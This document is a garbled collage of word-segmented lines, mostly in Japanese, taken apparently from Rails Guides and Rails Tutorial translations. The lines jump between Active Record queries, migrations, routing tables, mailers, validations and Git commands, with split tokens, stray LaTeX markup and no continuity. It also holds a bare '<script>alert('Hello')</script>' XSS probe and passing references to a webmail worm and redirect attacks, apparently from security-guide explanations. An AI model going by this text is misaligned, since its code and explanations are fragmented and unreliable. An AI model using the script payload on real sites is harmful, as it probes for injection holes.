Client ▖ w here ( created_at:  ( Time▖now ▖ mid night  -   1 ▖ day ) ▖ ▖
ちなみ に 、 \ kode {member } メソッド を 使 う と ユーザー id が 含 ま れ て い る URL を 扱 う よう に な り ま す が 、
テスト スイート を 実行 し て 、 新し い コード に 問題 が な い こと を 確認 し て くださ い 。
date  =  Date▖ new (2010 ,   6 ,   7 )
* `test ` 環境 は 、 自動 化 さ れ た テスト を 実行 する ため に 使用 さ れ ま す 。
削除 さ れ た ディレクトリ と ファイル が 無事 復旧 し ま し た 。
= = = = = = = = = = = = = = = = = = = = = = = = = = = = =
上 に 述べ た HTTP メソッド は 、 いずれ も リソース に 対 し て 特定 の 操作 の 実行 を 指示 する リクエスト で す 。
これ を 行な う に は 、 メール アドレス を ` " フル ネーム   < メール アドレス > " ` の 形式 で 指定 し ま す 。
その ため に 、 テキスト エディタ で \ kode { Gemfile } を 開 き ま す
なお 、 \ kode {authenticate } が User オブジェクト を 返 す こと は 重要 で は な く 、 返 っ て き た 値 の 論理 値 が \ kode {true } で あ る こと が 重要 で す 。
*  ` references `
Client ▖ w here ( " orders_count  >   10 " ) ▖ order(:name ) ▖ reverse_order
NOTE :   Active   Job は デフォルト で ジョブ を ': inline ' で 実行 し ま す 。
Client ▖exists ?
次 の `@ article ▖ save ` で 、 この モデル を データベース に 保存 し ま す 。
初心 者 が 学び やす く する ため に
   if loaded ?
   belongs_to  : customer ,  -> {  w here   active :  true   }
     create_table  : suppliers  do  | t |
  =>  Sat ,   0 2   Jan  2010   0 3 : 39 : 14   UTC   + 0 0 : 0 0
|   GET        | / magazines/: magazine _ id/ads           |  ads #index          |  ある 雑誌 1 冊 に 含 ま れ る 広告 を すべて 表示 する                           |
何 が テスト さ れ て い る の か を 自分 が 理解 でき て い る か 。
    adapter :  mysql 2
この メソッド で 使用 さ れ る 文法 は 、 ` ActiveRecord : : Base ▖find ` で 使用 さ れ て い る もの と 同じ で す 。
以下 の コマンド を コマンドライン で 実行 し 、 Rails コンソール を 起動 し ま しょ う 。
COMMIT
###  ミドルウェアスタック の 内容
rails  g   model  user  name :string
上 の 例 で は ` require ` と ` require_tree ` と い う ディレクティブ が 使用 さ れ て い ま す 。
\emph {scaffold } ジェネレータ と い う スクリプト を 使 っ て アプリケーション を すばや く 生成 する 事 に よ り 、   高度 な Rails プログラミング と Web プログラミング の 概要 を 学 び ま す 。
*  `config▖ logger ` は 、 ロガー を 指定 し ま す ▟ 指定 さ れ る ロガー は 、 Log 4 r また は Ruby の デフォルト の ` Logger ` クラス の インターフェイス に 従 い ま す 。
  $ rails   generate  controller   FooBars  baz  quux
* `increment_counter `
# =>  " sample % 5 B % 5 D = 3 ▖ 4 & sample % 5 B % 5 D = - 45 ▖ 6 "
次 の 例 で は 、 見かけ の 動作 は まったく 同じ で す が 、 通常 で は あ り え な い 場所 に コード が 置 か れ て い ま す 。
` : dependent => : restrict ` オプション は ` belongs_to ` から 削除 さ れ ま し た 。
##### ` collection_singular_ ids `
リスト \ ref{ code :mail _account_activation } で は 、 \ kode {mail } に \ kode { subject } キー も 引数 と し て 渡 し て い ま す ▟ この 値 は メール の 件名 に な り ま す 。
| --------- | ---------------- | ----------------- | -------------------- |
" { 幅 } x { 高 さ } " と い う 形式 で 特殊 な size タグ を 指定 する こと も でき ま す 。
画像 フォーマット の バリデーション
追伸 :   \kode {rails   g } は  \ kode {rails   generate } コマンド の 短縮 形 で あ り 、 Rails で サポート さ れ て い る 多数 の 短縮 形 の ひと つ で す   ( 表 \ ref{table : shortcuts} ) 。
*   修正 は 本当 に 有効 か 。
SELECT  *  FROM   clients   WHERE   ( clients▖ first _ name  =  ' Andy')   LIMIT   1
ユーザー に 返 す レスポンス 画面 を 完全 な ビュー に する の で あ れ ば 、 Rails は その ビュー を さらに 別 の レイアウト で ラッピング し 、 パーシャル ビュー と し て 取り出 す で しょ う 。
この エラー は ほとんど の 場合 、 開発 者 が ` ren der ` メソッド の 基本 的 な 動作 を 誤 っ て 理解 し て い る こと が 原因 で す 。
この 構成 は 、 Java Script など 他 の 言語 の ハッシュ 記法 に よ り 近 い もの に な っ て お り 、 Rails コミュニティ で も 人気 が 高ま っ て い ま す 。
  $ rake   db : rollback
最後 に 、  `index ` アクション の テンプレート ( ` app/views/articles/index▖html ▖erb ` ) に ' Destroy ' リンク を 追加 し 、 機能 を 完成 さ せ ま しょ う 。
*  `config▖ after_ initialize ` に は ブロック を 渡 す こと が でき ま す ▟ この ブロック は 、 Rails に よ る アプリケーション の 初期 化 が 完了 し た   _ 直後 _   に 実行 さ れ ま す 。
  #< Client   id :   1 ,   first _ name :  " Lucas "  > ,
以下 の 設定 オプション は 、 environment ▖ rb や production ▖ rb など の 環境 設定 ファイル の いずれ か で 使用 する の が 最適 で す 。
もちろん 、 ユーザー 表示 ページ の 最終 的 な 状態 は これ と は 大き く 異な り ま す し 、 この メール アドレス が この まま 一般 に 公開 さ れ る よう な こと も あ り ま せ ん 。
今後 は 他 の Active   Record コール バック と 同様 の エラー 処理 を 行 い ま す 。
* `new▖html ▖erb `
####   要素 の 変更
詳細 に つ い て は 、 Rails ガイド の 「 \ href { http://guides▖ rubyonrails ▖org / migrations ▖html}{ Active   Record   マイグレーション } 」 を 参照 し て くださ い 。
10 種類 の 人々
ウェブ ブラウザ の 種類 は 豊富 で す が 、 大半 の   Rails   開発 者 は   Firefox   や   Safari 、 あるいは   Chrome   を 使 い ま す 。
これ は リスト \ ref{ code : account_activation_edit_ action } で 使用 さ れ て い ま し た 。
関連 付け の 種類
class   Cookies Controller <  Application Controller
上 の コード は 以前 より 良 く な り ま し た が 、 まだ タイトル の テスト が 少し 長 すぎ ま す 。
極めて シンプル な doctype 宣言 で あ る \ kode {< ! DOCTYPE  html >} は 、 最新 の 標準 HTML   ( HTML 5 )   で あ る こと を 示 し て い ま す 。
上 の オプション は 、 モデル の 属性 設定 時 に マス アサインメント を 防止 する の に 便利 で す 。
いつ も の よう に データベース を 初期 化 し て 、 サンプル データ を 再度 生成 し 直 し 、 リスト \ ref{ code : seed_users_activated } の 変更 を 反映 し ま す 。
Client ▖find_or_create_by ( first _ name : ' Andy ')
* `: destroy ` を 指定 する と 、 関連 付け られ た オブジェクト も すべて 同時 に destroy さ れ ま す 。
今度 は テスト が 成功 する こと を 確認 し て くださ い 。
       create   config▖ ru
これ は リスト \ ref{ code :failing _ validates_name_spec } で 使用 さ れ て い ま し た 。
最初 の タイム スタンプ   ( `[timestamp _ 1 ] ` )   が 現在 時刻 、 次 の タイム スタンプ   ( `[timestamp _ 2 ] ` )   が 現在 時刻 に 1 秒 追加 し た 値 に な り ま す 。
[ " 6 " ,   " 7 " ,  nil ]
#### ` demodulize`
*  `config▖ action_view▖prefix _ partial _ path_with _controller_ namespace ` は 、 名前 空間 化 さ れ た コントローラ から 出力 さ れ た テンプレート に あ る サブ ディレクトリ から 、 パーシャル ( 部分 テンプレート ) を 探索 する か どう か を 指定 し ま す 。
リモート ブランチ 名 が ` my _pull_request ` の 場合 は 、 以下 を 実行 し ま す 。
    subject   i 18n ▖t   : subject
本書 で は 今後 、 この サンプル アプリケーション を 使 っ て い く こと に な る の で 、 \ href {https://github▖ com/new}{ GitHub } 上 に リポジトリ を 作成 し 、 プッシュ し て お く と 良 い で しょ う 。
具体 的 に は 、 レシーバ の ハッシュ キー に 対 し て ` to_s ` を 送信 し て い ま す 。
<optgroup   label= " Africa " >
ページ 上部 に 60 ピクセル の 余白 を 追加 し ま す 。
{ 0 } 図 5 ▖ 1 { / 0 } { 1 } サンプル アプリケーション の Home ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/home_ page _mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
デフォルト の オプション が ハッシュ で 与え られ る と 、 ` with _options ` は ブロック に 対 する プロキシ オブジェクト を 生成 し ま す 。
_   攻撃 者 は 偽 の リダイレクト で どんな こと が でき て しま う の で しょ う か 。
#### `tableize`
本番 環境 で クラウド ストレージ に 保存 する ため に は 、 リスト \ ref{ code :image_uploader_production } の よう に \ kode { fog}   gem を 使 う と 簡単 で す 。
これ は 、 ` ActiveSupport: : Callbacks ` が Rails   4 ▖ 1 リリース に あた っ て 大幅 に 書き換え られ た こと に よ る もの で す 。
#### `stringify _keys ` と ` stringify _keys !
111 ▖ 2345 ▖ to_s(:rounded)                      # = >   11 1 ▖ 23 5
たとえば 、 \ kode { foo } と い う 名前 の 関数 定義 を 見つけ る に は 、 「 def  foo 」 を グローバル 検索 し ま す 。
User は 複数 の Microposts を 持 っ て い て   ( \kode { has\_many} ) 、 Micropost は 1人 の User に 依存 し て い る   ( \kode {belongs\_to} )   と い っ た 関係 性 を モデル 化 し た
*   上記 以外 の 場合 、 引数 を 内側 に 含 ん だ 配列   ( 要素 が 1 つ だけ の 配列 )   が 返 さ れ ま す 。
この ガイド で は 、 Rails と Rack の 関係 、 Rails と 他 の Rack コンポーネント と の 関係 に つ い て 説明 し ま す 。
- -   create_table(:comments )
( 2 ▖ 0 ▖ 0 以外 の バージョン の Ruby を 使用 する 場合 は 、 Ruby の バージョン を 書き換え て くださ い ) 。
結合 モデル で 検証 ( validation ) 、 コール バック 、 追加 の 属性 が 必要 な の で あ れ ば 、 ` has_many : through ` を 使用 し ま しょ う 。
委譲 時 に ` NoMethodError ` が 発生 し て 対象 が ` nil ` の 場合 、 例外 が 発生 し ま す 。
フィクスチャ の ユーザー を 有効 に し て お く
基本 的 な モデル を 作成 し た の で 、 次 に 要求 さ れ る 制限 を 実現 する ため の バリデーション を 追加 し ま しょ う 。
` change ` メソッド は 、 与え られ た 年 、 月 、 日 に 応 じ て レシーバ の 日付 を 変更 し 、 与え られ な かっ た 部分 は その まま に し て その 日 付 を 返 し ま す 。
   validates :email_confirmation ,   presence :  true
列挙 可能   ( enumerable )   オブジェクト で あ る こと の 主な 条件 は 、 \ kode {each } メソッド を 実装 し て い る こと で す ▟ この メソッド は コレクション を 列挙 し ま す 。
                         foreign_key:   " patron_id "
    has_many  : paragraphs
 *   Michael   Hartl  wrote this   code ▖
* `loop :  true ` は 、 ビデオ を 最後 まで 再生 し 終わ っ た ら ループ し ま す 。
この 行 で は 、 \ kode {app/views/layouts/_shim▖html ▖erb } と い う ファイル を 探 し て その 内容 を 評価 し 、 結果 を ビュー に 挿入 し て い ま す
FROM   orders
query ▖ distinct ( false )
これ は リスト \ ref{ code :persistent_sessions_test } で 使用 さ れ て い ま し た 。
注 ： サイン イン と サイン アウト の アクション の ルーティング は カスタム で 設定 し ま す が 、 セッション の 生成 アクション へ の ルーティング は デフォルト を 使 い ま す   ( i▖e ▖ ,  \kode { [ resource   name ] _ path} ) ▖
この 節 で は メイラー と ビュー を 定義 し て 、 有効 化 トークン と メール アドレス   ( = 有効 に する アカウント の アドレス )   を 含 む リンク を その 中 で 使用 し ま す 。
      <p >
You  might  have   expected an   instance   of   Array ▖
    mount  Blorgh : : Engine  => "/blorgh "
上 で 実行 さ れ る SQL は 以下 の よう な もの に な り ま す 。
class   CreatePictures  <  ActiveRecord : : Migration
  <%= @ article ▖ text   %>
現在 の プロフィール ページ
これ は リスト \ ref{ code : test _helper_ log _ in } で 使用 さ れ て い ま し た 。
この ダミー アプリケーション は エンジン の マウント 場所 と し て 使用 さ れ る の で 、 エンジン の テスト が きわめて シンプル に な り ま す 。
こう い っ た とき に 便利 な \ kode {allow\_nil :  true } と い う オプション が あ る の で 、 これ を   \ kode { validates } に 追加 し ま す   ( リスト \ ref{ code :allow_blank_ password } ) 。
Active   Record の モデル を 作成 する
orders▖ clear
####  HTML を 出力 する
以上 で コントローラ と ビュー が 作成 さ れ ま し た ▟ Rails に " Hello ,   Rails ! " と 表示 さ せ て み ま しょ う 。
#   Rails   4 ▖ 0 の 場合
def  session_store = ( store )
[ 1 ,   2 ,   3 ] ▖ sum # = >   6
  $ rake   db : migrate
テンプレート の 最 下部 に 以下 を 追加 し ま す 。
第 \ ref { cha : sign_up } 章 で サイト に ユーザー を 追加 する とき に 備え て 、 最初 の \ kode {link\_to } に 仮 の リンク を 作成 し ま す 。
    address:              'smtp ▖ gmail ▖ com' ,
*   Rails   4 ▖ 0 で は 、 ` secret_key_ base ` が 設定 さ れ て い る と cookie ベース の セッション の 内容 が 暗号 化 さ れ ま す 。
####  モジュール 属性
####  ActiveSupport: : Concern を 使用 し て decorator パターン を 実装 する
個別 の メイラー ビュー は 、 その 名前 が メイラー メソッド と 同じ に な る の で 、 クラス から 認識 でき ま す 。
( \emph { ヒント } :   最初 に 、 \ kode {user_ params } の 許可 リスト に \ kode { admin } を \emph { 追加 } する 必要 が あ り ま す ) 。
第 \ ref { cha : log _ in_log _out } 章 で は 、 認証   ( authentication )   システム を 導入 し 、 ユーザー が ログ イン と ログ アウト を でき る よう に し ま す 。
*   Rails   4 ▖ 0 で は ` assert_ generates` 、 ` assert_recognizes` 、 ` assert_ routing ` の 動作 が 変更 さ れ ま し た 。
データベース の 用語 で 説明 する と 、 この 関連 付け が 行 わ れ て い る クラス に は 外部 キー が あ る と い う こと で す 。
    * `:user_ name `  -  メール サーバー で 認証 が 要求 さ れ る 場合 は 、 ここ で ユーザー 名 を 設定 し ま す 。
Content- Type :  text /html;  charset =utf - 8
ユーザー 登録 ページ で 重要 な 点 は 、 ユーザー 登録 に 欠かせ な い 情報 を 入力 する ため の \emph { form } で す 。
これ は リスト \ ref{ code : validates_uniqueness _of_email _ case _ insensitive } で 使用 さ れ て い ま し た 。
Rails は vanilla   Java Script を 出力 する こと も でき ま す 。
### ` validates_each `
マイグレーション は 、 データベース の 構造 を インクリメンタル に 変更 する 手段 を 提供 し ま す ▟ それ に よ り 、 要求 が 変更 さ れ た 場合 に データ モデル を 適合 さ せ る こと が でき ま す 。
上 の コマンド を 実行 する と 以下 の 情報 が 出力 さ れ ま す 。
" rubies " ▖ singularize    # => " ruby "
新し い セッション の フォーム が 正し く 表示 さ れ た こと を 確認 する
` store _accessors ` メソッド は ` json ` カラム や ` hstore ` カラム に 依存 し て い る の で 、 同様 に シンボル で の アクセス が 行え な く な り ま す 。
=>   " 1   error "
作成 し た テスト を リスト \ ref{ code : password _ reset_integration_test } に 示 し ま す ▟ この テスト は コード リーディング の よ い 練習 台 に な り ま す の で 、 みっちり お 読 み くださ い 。
Sprockets は アセット に アクセス する ため の メソッド を 特に 追加 し ま せ ん ▟ 従来 同様 ` javascript_ include_tag ` と `stylesheet_link_tag ` を 使用 し ま す 。
それ で は 実際 どの よう に 動作 する の か 見 て み ま しょ う
この メソッド は 以下 の よう な 定番 の 用法 に お い て 便利 で す 。
   def initialize
一部 の Web ブラウザ や プロキシ サーバー は この 種 の リダイレクト を キャッシュ する こと が あ り 、 その 場合 リダイレクト 前 の 古 い ページ に は アクセス でき な く な り ま す 。
{ 0 } 図 7 ▖ 6 { / 0 }   { 1 } Users リソース 追加 後 の の ユーザー 表示 ページ { / 1 }
Mime::Type ▖ register  'application/json - patch + json' ,  : json_patch
  => " the  user "
ren der   action :   " edit "
Rails の 慣習 に 従 っ て 、 関連 付け さ れ た テスト データ を fixture ファイル に 追加 する と 、 次 の よう に な り ま す 。
サブ ディレクトリ 内 の アセット に も アクセス でき ま す 。
A ▖ x  # => :a
webmail ワーム の 他 の 概念 実証 的 な 事例 と し て Nduja を 取り上げ ま す 。
( ▖▖▖)
####  まとめ
  $ rails   generate  model  User   name :string  email : string
     text Color   = $( this ) ▖ data ( " text - color " )
#### `belongs_to ` の オプション
アプリケーション 固有 の CSS 用 マニフェスト ファイル
### ` class_eval (*args ,  &block ) `
デフォルト は 、 ` ActionView: : Helpers: : FormBuilder ` で す 。
###  ルーティング の 「 concern 」 機能
ほぼ あらゆる オブジェクト を 文字 列 に 変換 する \ kode {to\_s } メソッド を 使用 し て 、 nil が メソッド に 応答 する 例 を お 目 に かけ ま しょ う 。
`split ` メソッド は 、 指定 の セパレータ で 配列 を 分割 し 、 分割 さ れ た チャンク を 返 し ま す 。
#     < id > 43 5 6 </ id >
関連 付け を 一括 読み込 み する
ファイル を 追加 する   ( \kode {▖ gitignore } で 指定 さ れ て い る もの を 除 く )   に は 、 以下 の コマンド を 実行 し ま す 。
ubsection   basic _ image_upload   ( end ) ╼╼╼\ subsection { 画像 の 検証 }  %  ( fold) ╼\ label{ sec : image_validation}╼╼
< script> alert ( ' Hello ') ;</ script>
` ids ` は 、 テーブル の 主 キー を 使用 する リレーション の ID を すべて 取り出 す の に 使用 でき ま す 。
ステージング エリア で 控え て い る 変更 を 本格 的 に リポジトリ に 反映   ( コミット )   する に は 、 \ kode { commit } コマンド を 使 い ま す 。
f " )  # => true
\ kode {first_app } ディレクトリ 直下 に あ る デフォルト の \ kode { Gemfile } 。
もちろん 、 今度 は メール アドレス の 存在 性 も 検証 し ま しょ う 。
上 で 実行 さ れ る SQL は 以下 の よう な もの に な り ま す 。
$  bin/rails   generate  scaffold  article  title : string   text : text
                                   QUERY   PLAN
` development ▖ rb ` で は デフォルト で ` true ` に 設定 さ れ ま す 。
####  ファイル を イン ライン で 添付 する
#   永続 セッション の ため に ユーザー を データベース に 記憶 する
` CONTROLLER ` 環境 変数 を 設定 する こと で 、 ルーティング 一覧 の 表示 を 特定 の コントローラ に マップ さ れ た もの に 制限 する こと も でき ま す 。
*  `config▖ active_ record ▖ schema_format ` は 、 データベース スキーマ を ファイル に 書き出 す 際 の フォーマット を 指定 し ま す 。
     GoodnessValidator ▖ new ( person ) ▖ validate
「 forgot   password 」 フォーム の モックアップ
###  Cookies シリア ライザ
既に 読者 の 皆 様 は 、 { 0 } cost { / 0 } 変数 の 定義 に 三 項 演算 子 を 使用 し た リスト { p 1 } の コード も 理解 でき る よう に な っ た こと で しょ う 。
これ は リスト \ ref{ code : validates_uniqueness _of_email_test } で 使用 さ れ て い ま し た 。
   validates : bio ,  length : {  maximum :   1000 ,
ステップ を 追加 し た ら 、 以下 を 実行 し ま す 。
  >>  x   =   1
Ruby で は 、 この 2 つ の クオーテーション を 併用 する こと が 一般 的 で す ▟ 詳し く は \ ref{ sec : strings } で 解説 し ま す 。
この 章 で は 、 \emph { 順序 } と \emph { 依存 関係 } を マイクロ ポスト に 追加 し 、 \ kode {user ▖microposts } メソッド が 実際 に マイクロ ポスト の 配列 を 返 す こと を テスト し ま す 。
変更 後 :
*   インデント は スペース 2 つ を 使用 する ▟ タブ 文字 は 使用 し な い こと 。
たとえば 次 の よう に な り ま す 。
` in_groups` は 、 配列 を 指定 の 個数 の グループ に 分割 し ま す 。
作成 し た コード を リスト \ ref{ code :user_profile_test } に 示 し ま す
たとえば 、 以下 の よう な ルーティング が 1 つ あ る と し ま す 。
HTTP  only  cookie は IE   v 6 から 使用 でき ま す 。
/*  footer * /
リスト \ ref{ code : follow _ form_ partial } で は 、 これ は フォーム を 囲 む \ kode {div } タグ で あ り 、 フォーム その もの で は な かっ た こと を 思い出 し て くださ い 。
今回 の 目的 は 、 ユーザー 毎 に すべて の マイクロ ポスト を 描画 でき る よう に する こと で す 。
*  `create_association ( attributes = {}) `
class   CreateArticles  <  ActiveRecord : : Migration
これ ら の カラム は 、 Active   Record が モデル 間 の 関連 付け を 作成 する とき に 参照 さ れ ま す 。
Rails チーム は 、 パブリック な API に 対 し て 重大 な 変更 を 行な う 際 は 、 必ず 非 推奨 サイクル を 経 て から 行な う こと に し て い ま す 。
   class   Template  < :: Tilt : : Template
例外 と 例外 ハンドリング は 、 ある 意味 で Ruby の 高度 な テーマ で す ▟ 本書 で は 例外 に つ い て これ 以上 言及 し ま せ ん 。
` Enumerable ` の 拡張
X - Cache:   HIT
デザイン さ れ た ロゴ と サンプル アプリ
次 に 、 \ kode { data-turbolinks - track } に お け る キー と 値 の ペア の 表記 が 、 旧式 の ハッシュ ロケット   ( =>)   スタイル に な っ て い る 点 が 不思議 で す 。
各 ネスティング レベル で は 、 自身 の 呼び出し に 、 継承 し た デフォルト 呼び出し を マージ し ま す 。
現在 の Active   Record で は 、 ` after_ rollback ` や ` after_ commit ` コール バック で の 例外 を 抑制 し て お り 、 例外 時 に は ログ 出力 のみ が 行 わ れ ま す 。
\ kode {help } アクション に 対応 する ビュー も 、 上 の コード と 似 て い ま す   ( リスト \ ref{ code : raw _help_view} ) 。
User モデル に 完全 な フィード を 追加 する 。
\ ref{ sec : demo_ users _ resource } で 簡単 に 説明 し た とおり 、 この カラム は 自動 的 に 作成 さ れ 、 Rails が 各行 を 一意 に 識別 する ため に 使用 し ま す 。
## #  部分 テンプレート ( パーシャル ) を 使用 し て ビュー の 重複 コード を きれい に する
\ kode {email } 属性 の 存在 性 を 検証 する
新し い メソッド は ` qualified_const_defined ? ` 、 `qualified_const _ get ` 、 `qualified_const_set ` で す 。
Active   Record オブジェクト の コレクション を 渡 す こと も でき ま す 。
create  mode   100 6 44   README ▖ md
   belongs_to   : supplier ,   inverse _of:  : account
      #  従 っ て ここ で pry を 呼び出 し て も 問題 な い
トークン 生成 用 メソッド を 追加 する
クラス の 変更 内容 が 単純 で あ れ ば 、 ` Class# class_eval ` を 使用 し ま す 。
` deconstantize ` メソッド は 、 フル パス の 定数 を 表 す 参照 表現 を 与え られ る と 、 一番 右 の 部分   ( 通常 は 定数 名 )   を 取り除 き ま す 。
The   result   is   that   the  \ kode { full_title}   method   is   \ href { http://catb▖org /jargon/html / A/automagically▖html} { automagically}   available  in   all  our views▖
` : on ` オプション を 使用 し て 、 たとえば 以下 の よう に 別 の new アクション を 追加 でき ま す 。
class   Comments Controller <  Application Controller
###  デフォルト スコープ を 適用 する
失敗 する テスト が 書け た の で 、 ようやく フリンドリー フォワーディング を 実装 する 準備 が でき ま し た
#  config ▖ assets▖ prefix   = "/assets " は 、 アセット の 置き 場所 と な る パス を 変更 する 際 に 使用 する 。
デフォルト は 空 文字 列 で す 。
後 で 統合 時 に 悩 ま ず に す む よう 、 アプリ を なるべく 早 い 段階 で Heroku に デプロイ し て お く と よ い で しょ う 。
最初 に 、 リスト { p 0 } で 示 し て い る よう に Bootstrap を 追加 し ま しょ う ▟ これ は 、 { 2 } bootstrap - sass{ / 2 }   gem を 使用 し て Rails アプリケーション に 導入 でき ま す 。
ActionView:: MissingTemplate :
\ ref{ sec : destroying _ users } で 書 い た よう に 、 サイト 管理 者 は ユーザー を \emph { 破棄 する } 権限 を 持 ち ま す 。
続け て ログ イン を 行 っ た 後 、 転送 先 の URL は デフォルト   ( プロフィール 画面 )   に 戻 る 必要 も あ り ま す の で 、 これ も テスト で 確認 し て くださ い 。
後 で 使 う ため に 記憶 トークン を cookies に 保存 する 方法 の 説明 が 終わ り ま し た の で 、 今度 は 移動 先 の ページ で ユーザー を 取り出 す 方法 に つ い て 学 び ま しょ う 。
| --------- | ---------------- | ----------------- | -------------------------------------------- |
self を 省略 し た 結果 を リスト \ ref{ code : log _out _ method } に 示 し ま す 。
メール を 配信 する 前 に 何 ら か の 編集 を 加え た い こと が あ り ま す 。
バナー 広告 は 、 比較 的 目新し い 攻撃 点 で す 。
リスト \ ref{ code : default_controller_test } を 参考 に すれ ば 、 正し い テスト コード を 何 と な く 想像 でき る と 思 い ま す ▟ 正し い テスト コード を リスト \ ref{ code :about_test } に 示 し ま す 。
\ kode { count } 関連 付け メソッド は 賢 く でき て い て 、 直接 データベース で カウント を 行 い ま す 。
*   FROM   " users "   WHERE   " users " ▖ " state "   =  'active'
   <option   value = " 1 "   selected=" selected " > David < /option >
#   指定 さ れ た 分 を デフォルト 値 と し て 持 つ セレクト ボックス を 生成 する
これ ら の 置き 場所 の 詳細 に つ い て は 、 [ アセット パイプライン ガイド の 「 アセット の 編成 」 ] ( asset_pipeline ▖html # アセット の 編成 )   を 参照 し て くださ い 。
self を 省略 し た 結果 を リスト \ ref{ code :persistent_sessions_test } に 示 し ま す 。
なお 、 次 の リスト に は 、 変更 を 加え た 節 また は コード へ の リンク が 追加 し て あ り ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : comment _out _failing _ tests } に 示 し ま す 。
###  イニシャライザ
╼╼    \ subsection {Users コントローラ } %  ( fold) ╼    \ label{ sec : users_controller} ╼╼
ユーザー と 能動 的 関係 の 関連 付け に よ っ て 使え る よう に な っ た メソッド の まとめ
SELECT   clients▖
###  トランザクション コール バック の エラー 処理
                                #   その 後 データベース から 再度 読み込 ま れ る
必要 で あ れ ば 、 コレクション や コレクション の 各 メンバー に 対 し て 適用 さ れ る リソース を 追加 する こと も でき ま す 。
Regexp ▖ new ('▖',   Regexp : : MULTILINE ) ▖ multiline ?  
#   Rails   4 ▖ 1 の 場合
その 途中 で 、 Rails の 開発 環境 や 本番 環境 から メール を 送信 する 方法 に つ い て も 学習 し ま す 。
select_date ( Time▖ today   +   6 ▖ days)
テ スティング 用 に edge  Rails を 入手 する 方法 に つ い て は 後述 し ま す 。
今回 の 場合 、 そう し た 変数 は SendGrid アドオン が 自動 的 に 設定 し て くれ ま す が 、 \ ref{ sec : image_upload _ in_production } で は 環境 変数 を 自分 で 設定 し な けれ ば な り ま せ ん 。
オブジェクト に 渡 さ れ る メッセージ は 、 一般 に は \emph { メソッド } と 呼 ば れ ま す ▟ メソッド の 実体 は 、 その オブジェクト に 定義 さ れ た 関数 で す
生成 さ れ た ばかり の User モデル
そこ で 、 サイン アウト の 機能 を 実装 する 前 に その 部分 を もう 少し 作り込 み ま しょ う 。
{ 0 } 図 10 ▖ 4 { / 0 } { 1 } マイクロ ポスト が 表示 さ れ た プロファイル ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/user_microposts_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
}╼╼╼    %  subsection   database_migrations   ( end ) ╼╼    \ subsection { model ファイル }  %  ( fold) ╼    \ label{ sec : the_model_file} ╼╼
self を 省略 し た 結果 を リスト \ ref{ code : follow_unfollow _ following } に 示 し ま す 。
Rails アプリケーション の セキュリティ の 詳細 に つ い て は 、 本 ガイド の [ Rails セキュリティ ガイド ] ( security▖html ) を 参照 し て くださ い 。
[ 1 ,   2 ,   3 ] ▖ in_groups_of ( 2 ,   0 )   # =>  [ [ 1 ,   2 ] ,   [ 3 ,   0 ] ]
Client ▖ order ( created_at:  : desc)
    resources   :images ,  only: :index
これ ら の 階層 に あ る クラス の 詳細 を 知 る 必要 は な い と 思 い ま す 。
くくりだ し た メソッド は 、 マス アサインメント を 避け る だけ で な く 、 外部 から 不正 に 呼び出 さ れ る こと の な い よう に ` private ` 宣言 の 後 に 置 い て くださ い 。
生成 し 終わ っ た ら 、 Rails サーバー を 一 度 落と し て 、 起動 し直 し て くださ い 。
   if @book ▖nil ?
Git で バージョン 管理 を 行 っ て い る の で あ れ ば 、 以下 の コマンド を 実行 し て 、 静的 な ページ 用 の トピック ブランチ を チェックアウト し ま しょ う 。
デフォルト で は 、 レコード は 主 キー の 昇順 に 取り出 さ れ ま す ▟ 主 キー は 整数 で な けれ ば な り ま せ ん 。
空き を 埋め る 値 は 2 番 目 の オプション 引数 で 指定 でき ま す 。
それ で は 、 コンソール で 文字 列 に つ い て 調べ て み ま しょ う 。
テスト 駆動 開発 は 、 テスト で バグ を 再現 し て から デバッグ し た い 場合 に 便利 で す 。
ユーザー 登録 失敗 時 に エラー メッセージ が 表示 さ れ る よう に する
    ren der   " edit "
有効 な メール フォーマット を テスト する
bcrypt を 使 っ て 生成 さ れ て い る の で 、 この 文字 列 から 元々 の パスワード を 導出 する こと は 、 コンピュータ を 使 っ て も 非 現実 的 で す
有効 な ユーザー 登録 に 対 する テスト
この リスト で は 、 Rails   3 ▖ 2 向け の 第 2 版 を 既に 読 み 終わ っ た 方 の ため に 、 変更 さ れ た 箇所 だけ を まとめ ま し た 。
###  バリデーション を 行な う 理由
index ビュー   ( `app/views/users/index▖html ▖erb ` )   の 内容 は 以下 の よう に な り ま す 。
有効 な User か どう か を テスト する   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
Date▖ new (2010 ,   4 ,   30 ) ▖ months_ago ( 2 )      # =>  Sun ,   28   Feb   2010
Active   Support は 、 `load ` に 一定 の 自動 読み込 み サポート を 追加 し ま す 。
=>  " Example  User "
なお 、 これ は 上 の sanitize ( ) フィルタ で 認識 さ れ ま す 。
   def  perform ( trashable ,   depth)
<% =  ren der  " menu "  %>
いよいよ 、 コメント フォーム が 動作 する の に 必要 な 最後 の 手順 を 行 い ま しょ う 。
" Invoice Line " ▖tableize # => " invoice _ lines "
どう やら フォーム の 送信 先 は 別 の URL に し な けれ ば な ら な い よう で す 。
*   イン ライン 添付 を 使用 する こと を Mail に 指示 する に は 、 Mailer 内 の attachments メソッド に 対 し て ` #inline ` を 呼び出 す だけ で 済 み ま す 。
この とき の 、 コントローラ から ビュー へ の 結果 の 渡 し 方 こそ が 本 ガイド の 主な トピック で す 。
実際 、 この 手法 は 実 に 便利 な の で 、 Active   Record は 以下 で も デフォルト で 同じ 結果 を 返 し ま す 。
\ kode {about } 用 の ルート を 追加 する
ユーザー を フォロー し た 後 、 本当 に その ページ から 離れ て 元 の ページ に 戻 ら な い と いけ な い の で しょ う か ▟ この 点 を 考えなお し て み ま しょ う 。
以下 の マイ グレーション を コマンドライン で 実行 し て 図 \ ref { fig :user_ model_account_activation } の データ モデル を 追加 する と 、 3 つ の 属性 が 新し く 追加 さ れ ま す 。
|   DELETE     | /sekret/ comments/: id ( ▖: format )          |  comments# destroy  |  comment_ path          |
    database :   NOT _my_ database
その 中 で も 特に お 勧め の Rails の 情報 源 を 紹介 し ま す 。
    belongs_to  : author ,   class_ name :  " User "
しかし 、 この よう に せ ざる を 得 な い 場合 は 、 ` w here ` を 通常 どおり に 使用 する こと が でき ま す 。
ren der   json : @product
